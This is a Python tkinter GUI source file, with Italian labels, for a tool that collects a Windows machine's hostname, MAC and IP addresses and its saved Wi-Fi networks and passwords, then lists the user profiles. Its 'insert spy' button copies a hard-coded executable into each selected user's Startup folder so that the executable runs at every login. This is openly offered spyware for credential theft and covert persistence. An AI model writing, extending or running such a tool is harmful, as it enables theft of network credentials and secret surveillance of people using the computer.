import tkinter as tk
import tkinter.font as tkfont
from tkinter import filedialog
import socket
from datetime import datetime
from pathlib import Path
from uuid import getnode as get_mac
import shutil

import Tool
from Tool.notifica import Notifica
from Tool.createJson import createJson

lista_wifi = []
lista_password = []
webs = {}
meta_lista_utenti = []
lista_utenti = []
variabili_tk = []
utenti_scelti = []
utenti_scartati = []

mac_ad = get_mac()
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
now = datetime.now().strftime("%H:%M:%S")


class ToolGUI(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)

        self.title("Tools GUI ∼ @APPA_py on tg")
        self.geometry("750x500")
        self.resizable(False, False)
        self.attributes("-topmost", True)


        self.descrizione = tk.Label(self, text="Ecco cosa puoi fare", font=tkfont.Font(family="Verdana", size=18))
        self.descrizione.pack(pady=5)

        self.bottone_rete = tk.Button(self, text="Preleva Dati da questo Computer", command=self.takewifi)
        self.bottone_rete.pack(side=tk.LEFT, anchor=tk.N, padx=30, pady=30, ipady=2, ipadx=2)

        self.bottone_utenti = tk.Button(self, text="Preleva gli Utenti presenti nel Computer", command=self.getUtenti)
        self.bottone_utenti.pack(side=tk.LEFT, anchor=tk.N, padx=30, pady=30, ipadx=2, ipady=2)

    def takewifi(self):
        for widget in self.pack_slaves():
            widget.destroy()

        extractor = Tool.extractor(lista_wifi, lista_password, webs)
        reti = extractor.extractWeb()

        self.scritta_intro = tk.Label(self, text=f"Ecco le informazioni che ho estratto da {hostname}",
                                      font=tkfont.Font(family="Helvetica", size=18))
        self.scritta_intro.pack(pady=5)

        self.scritta_reti = tk.Label(self, text=f"INFORMAZIONI ESTRATTE DA: {hostname}\n\n\n\n•Hostname: {hostname}\n\n•Indirizzo MAC: {mac_ad}\n\n•Indirizzo IP: {IPAddr}\n\n•Reti Estratte: {reti}", font=tkfont.Font(family="Verdana", size=10))
        self.scritta_reti.pack(side=tk.LEFT, anchor=tk.NW)

        self.salvaFile = tk.Button(self, text="Salva File", command=self.salva_file)
        self.salvaFile.place(x=680, y=230, width=65, height=25)

        self.gohome()


    def salva_file(self):
        file_filter = [("JSON Extension", "*.json")]

        try:
            filepath = filedialog.asksaveasfilename(filetypes=file_filter, defaultextension=".json", initialfile=f"Info di {hostname}")
            createJson(filepath, extension=False)
            Notifica("Creazione File JSON", True, f"Il file JSON è stato creato con successo:\n {filepath}")
        except FileNotFoundError:
            Notifica("Creazione File JSON", False, "Si è verificato un errore nella creazione del file JSON!")



    def getUtentis(self) -> list:

        users = Path("C:\\Users")
        for utenti in users.iterdir():
            meta_lista_utenti.append(utenti)
        meta_lista_utenti.reverse()
        for i in meta_lista_utenti:
            if "C:\\Users\\Public" in str(i):
                continue
            lista_utenti.append(i)
        # print(lista_utenti)
        return lista_utenti

    def getUtenti(self):
        for widget in self.pack_slaves():
            widget.destroy()

        if len(lista_utenti) <= 0:
            self.getUtentis()
        else:
            pass

        self.scritta_intro = tk.Label(self, text="Ecco la lista degli utenti che ho estratto dal PC:", font=tkfont.Font(family="Helvetica", size=18))
        self.scritta_intro.pack(anchor=tk.NW, pady=5, expand=False)

        for utente in lista_utenti:
            tk.Label(self, text=f"{utente}\n\n\n", font=tkfont.Font(family="Verdana", size=10), wraplength=200).pack(side=tk.LEFT, anchor=tk.N)

        self.spia = tk.Button(self, text="Inserisci Spia", command=self.spionaggiostart)
        self.spia.pack(side=tk.RIGHT, anchor=tk.N, ipadx=4)

        self.torna_indietro = tk.Button(self, text="Torna Indietro", command=lambda: (self.destroy(), ToolGUI().mainloop()))
        self.torna_indietro.place(x=650, y=200, width=100, height=30)  # .pack(side=tk.RIGHT, anchor=tk.E,ipadx=20, padx=5)


    def spionaggiostart(self):
        for widget in self.pack_slaves():
            widget.destroy()

        try:
            for widget in self.place_slaves():
                widget.destroy()
        except:
            pass

        for utenti in lista_utenti:
            var = tk.IntVar()
            variabili_tk.append(var)

        for i, utenti in enumerate(lista_utenti):
            self.checkButton = tk.Checkbutton(self, text=utenti, variable=variabili_tk[i])
            self.checkButton.pack()

        self.tastoK = tk.Button(self, text="Conferma", command=self.getspia)
        self.tastoK.pack()

        self.gohome()


    def getspia(self):
        for i, utenti in enumerate(lista_utenti):
            if variabili_tk[i].get() == 1:
                path = f"{str(utenti)}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                try:

                    shutil.copy("D:\\I miei Progetti\\Python\\Notifica.exe", path)
                    # shutil.copy("C:\\Users\\gabri\\PycharmProjects\\ToolStol\\prova.py", utenti)
                    utenti = str(utenti).replace("\\", "/")
                    utenti_scelti.append(utenti)

                except:
                    utenti_scartati.append(utenti)

        # print(utenti_scelti, utenti_scartati)


        if len(utenti_scelti) <= 0:
            Notifica("Inserimento Spia", False, "Con la Seguente Operazione non hai inserito il file in alcun utente, si desidera di Riprovare")
        else:
            Notifica("Spia inserita correttamente", True, f"Hai inserito correttamente il file nei seguenti utenti: \n{utenti_scelti}")


        if len(utenti_scartati) <= 0:
            pass
        else:
            utenti_scartatis = []

            for utentis in utenti_scartati:
                utenti = str(utentis).replace("\\", "/")
                utenti_scartatis.append(utenti)

            Notifica("Inserimento Spia", False, "Non ho inserito la spia nei seguenti utenti: \n{}".format(utenti_scartatis))

        utenti_scelti.clear()
        utenti_scartati.clear()
        utenti_scartatis.clear()



    def gohome(self):
        self.torna_indietro = tk.Button(self, text="Torna Indietro", command=lambda: (self.destroy(), ToolGUI().mainloop()))
        self.torna_indietro.pack(side=tk.RIGHT, anchor=tk.E, ipadx=10, padx=5)
